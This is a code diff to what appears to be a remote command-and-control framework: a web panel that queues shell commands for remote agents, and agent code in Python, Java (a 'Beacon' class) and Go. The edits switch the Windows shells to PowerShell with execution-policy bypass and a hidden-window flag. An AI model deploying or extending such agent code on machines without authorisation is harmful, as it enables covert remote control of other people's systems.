@@ -1876,11 +1876,22 @@ async function fbRead(agentId, fullPath, filename) {
   const ext    = filename.includes('.') ? filename.split('.').pop().toLowerCase() : '';
   const isImg  = /^(png|jpg|jpeg|gif|bmp|webp|ico|svg|tiff?)$/.test(ext);
   const isPdf  = ext === 'pdf';
-  const isDocx = /^docx?$/.test(ext);
-  const isXlsx = /^xlsx?$/.test(ext);
-  const isPpt  = /^pptx?$/.test(ext);
+  // ~$*.doc/docx are Office temp lock files — binary, not real documents
+  const isTempOffice = filename.startsWith('~$');
+  const isDocx = /^docx?$/.test(ext) && !isTempOffice;
+  const isXlsx = /^xlsx?$/.test(ext) && !isTempOffice;
+  const isPpt  = /^pptx?$/.test(ext) && !isTempOffice;
 
   const errHtml = msg => `<span style="color:var(--danger);padding:8px">${escapeHtml(msg)}</span>`;
+
+  if (isTempOffice) {
+    contentEl.innerHTML = `<div style="padding:24px;color:var(--text2);text-align:center">
+      <div style="font-size:32px;margin-bottom:12px">🔒</div>
+      <div>${_lang==='es'?'Archivo temporal de Office (lock file). No se puede previsualizar.':'Temporary Office lock file. Cannot be previewed.'}</div>
+      <div style="font-size:11px;margin-top:8px;color:var(--text3)">${escapeHtml(filename)}</div>
+    </div>`;
+    return;
+  }
 
   if (isImg) {
     const b64 = await _fbFetchB64(agentId, fullPath);
@@ -1949,7 +1960,13 @@ async function fbRead(agentId, fullPath, filename) {
   } else {
     // Plain text / code / no extension
     const isWin = fullPath.includes('\\');
-    const cmd   = isWin ? `type "${fullPath}"` : `cat "${fullPath}"`;
+    // PowerShell Get-Content handles spaces, Unicode and special chars better than `type`
+    // Escape single quotes in the path by doubling them (PowerShell convention)
+    const psPath = fullPath.replace(/'/g, "''");
+    const cmd   = isWin
+      ? `powershell -NoProfile -Command "Get-Content -Raw '${psPath}'"`
+      : `cat "${fullPath.replace(/"/g, '\\"')}"`;
+
     const r = await apiFetch('/api/agents/' + agentId + '/tasks', {
       method: 'POST', body: JSON.stringify({ command: cmd }),
     });
@@ -1964,7 +1981,11 @@ async function fbRead(agentId, fullPath, filename) {
       const td = await tr.json();
       if (td.status !== 'done' && td.status !== 'error') return;
       clearInterval(poll);
-      contentEl.innerHTML = `<pre style="margin:0;white-space:pre;word-break:normal;overflow-x:auto;font-family:var(--font-mono);font-size:12px;line-height:1.7;padding:4px">${escapeHtml(td.output || '(vacío / empty)')}</pre>`;
+      if (td.status === 'error' || !td.output) {
+        contentEl.innerHTML = errHtml(td.output || (_lang==='es'?'Sin respuesta del agente':'No response from agent'));
+      } else {
+        contentEl.innerHTML = `<pre style="margin:0;white-space:pre;word-break:normal;overflow-x:auto;font-family:var(--font-mono);font-size:12px;line-height:1.7;padding:4px">${escapeHtml(td.output)}</pre>`;
+      }
     }, 1500);
   }
 }
@@ -3542,7 +3563,7 @@ def run_command(cmd, task_id=None):
         _sid = cmd[8:]
         def _pty_run(sid=_sid):
             if _WIN:
-                _proc = subprocess.Popen('cmd.exe', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=0x08000000)
+                _proc = subprocess.Popen(['powershell.exe', '-NoProfile', '-NoLogo'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=0x08000000)
                 def _rd():
                     while True:
                         c = _proc.stdout.read(512)
@@ -3631,16 +3652,17 @@ def run_command(cmd, task_id=None):
     try:
         if _WIN:
             import tempfile as _tf
-            _tbat = _tf.mktemp(suffix='.bat')
+            _tps1 = _tf.mktemp(suffix='.ps1')
             try:
-                with open(_tbat, 'w') as _bf:
-                    # cmd.exe misparses "C:\" — the \" looks like an escaped quote.
-                    # Appending a dot ("C:\.") avoids trailing-backslash before the closing quote.
-                    _safe_cwd = _cwd if not _cwd.endswith('\\\\') else _cwd + '.'
-                    _bf.write('@echo off\\r\\ncd /d "{}"\\r\\n{}\\r\\necho __CWD__:%CD%\\r\\n'.format(_safe_cwd, cmd))
-                result = subprocess.run(_tbat, shell=True, capture_output=True, text=True, timeout=60)
+                with open(_tps1, 'w', encoding='utf-8') as _bf:
+                    _safe_cwd = _cwd.replace("'", "''")
+                    _bf.write("Set-Location '{}'\n{}\nWrite-Output ('__CWD__:' + (Get-Location).Path)\n".format(_safe_cwd, cmd))
+                result = subprocess.run(
+                    ['powershell.exe', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', _tps1],
+                    capture_output=True, text=True, timeout=60
+                )
             finally:
-                try: os.remove(_tbat)
+                try: os.remove(_tps1)
                 except: pass
         else:
             wrapped = 'cd {} && {}; echo "__CWD__:$(pwd)"'.format(_json.dumps(_cwd), cmd)
@@ -4257,7 +4279,7 @@ public class Beacon {
         // Shell command
         try {
             ProcessBuilder pb = isWin
-                ? new ProcessBuilder("cmd.exe", "/c", cmd)
+                ? new ProcessBuilder("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd)
                 : new ProcessBuilder("/bin/sh", "-c", cmd);
             pb.directory(new File(cwd));
             pb.redirectErrorStream(true);
@@ -4747,7 +4769,7 @@ func _runCmd(cmd, taskID string) string {
 \t\tsid := cmd[8:]
 \t\tgo func() {
 \t\t\tvar proc *exec.Cmd
-\t\t\tif isWin { proc = exec.Command("cmd.exe") } else { proc = exec.Command("/bin/bash", "-i") }
+\t\t\tif isWin { proc = exec.Command("powershell.exe", "-NoProfile", "-NoLogo") } else { proc = exec.Command("/bin/bash", "-i") }
 \t\t\tstdin, _ := proc.StdinPipe()
 \t\t\trPipe, wPipe, _ := os.Pipe()
 \t\t\tproc.Stdout = wPipe; proc.Stderr = wPipe; proc.Dir = _cwd
@@ -4779,7 +4801,7 @@ func _runCmd(cmd, taskID string) string {
 \t\treturn "cd: " + target + ": No such directory"
 \t}
 \tvar c *exec.Cmd
-\tif isWin { c = exec.Command("cmd.exe", "/c", cmd) } else { c = exec.Command("/bin/sh", "-c", cmd) }
+\tif isWin { c = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd) } else { c = exec.Command("/bin/sh", "-c", cmd) }
 \tc.Dir = _cwd
 \tout, err := c.CombinedOutput()
 \tresult := strings.TrimRight(string(out), "\\n\\r")
@@ -4841,6 +4863,7 @@ function showWindowsInstructions() {
     <div style="margin-top:8px;font-size:11px;color:var(--text3)">Descarga el <code style="color:var(--accent)">.py</code> con el botón de arriba y transfiere a Windows.</div>
   `;
 }
+
 
 async function downloadBeacon(type) {
   const code = document.getElementById('beacon-code').textContent;
